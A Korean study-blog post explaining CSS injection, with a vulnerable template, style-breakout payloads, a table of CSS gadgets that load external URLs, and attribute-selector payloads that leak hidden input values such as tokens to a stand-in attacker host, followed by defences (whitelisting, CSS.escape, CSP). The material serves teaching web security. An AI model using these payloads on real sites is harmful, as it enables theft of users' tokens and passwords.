---
title: "[2025-08-13] CSS Injection"
excerpt: "CSS Injection"

categories:
  - Justice
tags:
  - [CSS Injection]

permalink: /Justice/[2025-08-13] CSS Injection/

toc: true
toc_sticky: true

date: 2025-08-13
last_modified_at: 2025-08-13
---

## 🦥 본문

### 정의 및 개념

CSS Injection은 사용자 입력값을 CSS 코드에 직접 삽입할 대 발생하는 취약점. UI 변조, 데이터 탈취, 브라우저 동작 변경 등을 수행할 수 있다.

- 데이터로는 CSRF Token, 피해자의 API Key 등 CSS 선택자를 통해 표현이 가능한 데이터만 탈취 가능.
- CSS 선택자로 표현 불가능한 스크립트 태그 내 데이터는 탈취 불가

### 공격 방법

- 예제 코드
    
    ```jsx
    <style>
    body { background-color: ${theme}; }
    </style>
    <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>
    if '<' in theme:
        exit(0)
    ```
    
    - 사용자의 입력 `theme` 이 배경색을 결정
- 색상 변경
    - 위의 코드에서는 body의 배경 색만 변경이 가능함
    - `yellow; } h1 { color: red` 값을 입력하는 경우 `h1` 태그의 글씨 색 변경 가능
    
    ```jsx
    <style>
    body { background-color: yellow; } h1 { color: red; }
    </style>
    <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>
    ```
    
- IP Ping Back : Client-Side 공격을 통해 데이터를 외부로 탈취하기 위해서는 공격자의 서버로 요청을 보내야 함. Ping Back을 통해 외부 요청 전송 가능
    - 외부 리소스를 불러오는 기능
        
        
        | CSS 가젯 | 설명 |
        | --- | --- |
        | `@import 'https://leaking.via/css-import-string';` | 외부 CSS 파일을 로드합니다. 모든 속성 중 가장 상단에 위치해야 하며, 그렇지 않으면 `@import`는 무시됩니다. |
        | `@import url(https://leaking.via/css-import-url);` | `url` 함수는 URL을 불러오는 역할을 합니다. 상황에 따라서 선택적으로 사용할 수 있습니다. |
        | `background: url(https://leaking.via/css-background);` | 요소의 배경을 변경할 때 사용한 이미지를 불러옵니다. |
        | `@font-face { font-family: leak; src: url(https://leaking.via/css-font-face-src); }` | 불러올 폰트 파일의 주소를 지정합니다. |
        | `background-image: \000075\000072\00006C(https://leaking.via/css-escape-url-2);` | CSS에서 함수를 호출할 때 ascii 형태의 `"url"`이 아닌 hex 형태(`"\000075\000072\00006C"`)도 지원합니다. |
    - `yellow; background: url(”https://aaaaaa.request.attack.server/ping-back”)` 을 입력하면 해당 서버에 요청을 보내는 방식으로 IP ping back 수행
        
        ```jsx
        <style>
        body { background-color: yellow; background: url("https://aaaaaa.request.attack.server/ping-back"); }
        </style>
        <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>
        ```
        
- 데이터 탈취
    - 예제 코드
        
        ```jsx
        <style>
        body { background-color: ${theme}; }
        </style>
        <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>
        <input readonly type="password" value="apple">
        if '<' in theme:
            exit(0)
        ```
        
        - `input` 요소 추가
    - CSS Attribute Selector (특성 선택자)
        
        ```jsx
        input[attr=value] {}
        ```
        
        - `attr`이 `value`인 `input` 요소에 대한 스타일 지정
        
        | 구문 | 설명 |
        | --- | --- |
        | `[attr]` | `attr`이라는 이름의 특성을 가진 요소를 선택합니다. |
        | `[attr=val]` | `attr`이라는 이름의 특성값이 정확히 `value`인 요소를 선택합니다. |
        | `[attr~=value]` | `attr`이라는 이름의 특성값 중 정확히 `value`가 있는 요소를 선택합니다. `attr` 특성은 공백으로 구분된 여러 개의 값을 가질 수 있습니다. |
        | `[attr^=value]` | `attr`이라는 특성값을 가지고 있으며, 접두사로 `value`가 값에 포함되어 있으면 이 요소를 선택합니다. |
        | `[attr$=value]` | `attr`이라는 특성값을 가지고 있으며, 접미사로 `value`가 값에 포함되어 있으면 이 요소를 선택합니다. |
    - `yellow; } input[value^=S3CR3T_] { background: url("https://aaaaaaa.request.dreamhack.games/lols"); }` 코드를 입하면 input 요소의 value 속성의 접두사가 `S3CR3T_` 일 때 해당 서버로 요청 전송
        
        ```jsx
        <style>
        body { background-color: yellow; } input[value^=S3CR3T_] { background: url("https://aaaaaaa.request.dreamhack.games/lols"); }
        </style>
        <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>
        <input readonly type="password" value="apple">
        if '<' in theme:
            exit(0)
        ```
        
    - `input` 태그의 `value` 값을 알아내는 것이 왜 중요한가?
        
        → `readonly` 또는 `hidden input` 요소에 비밀번호, 토큰, 쿠폰 코드, CSRF Token, 세션 키 등을 넣어두는 경우가 많음
        
        → 미리 채워둔 이메일 인증 번호나, 관리자 비밀번호 등을 탈취 가
        

### 대응 방법

1. 입력 검증 : CSS 구문에 사용자 입력을 넣지 않거나, 반드시 화이트리스트로 제한
2. 출력 시 이스케이프 : CSS 컨텍스트에 맞는 escaping 적용. CSS.escape() 사용
3. CSP 적용 : `style-src` 속성을 `self`나 `nonce` 적용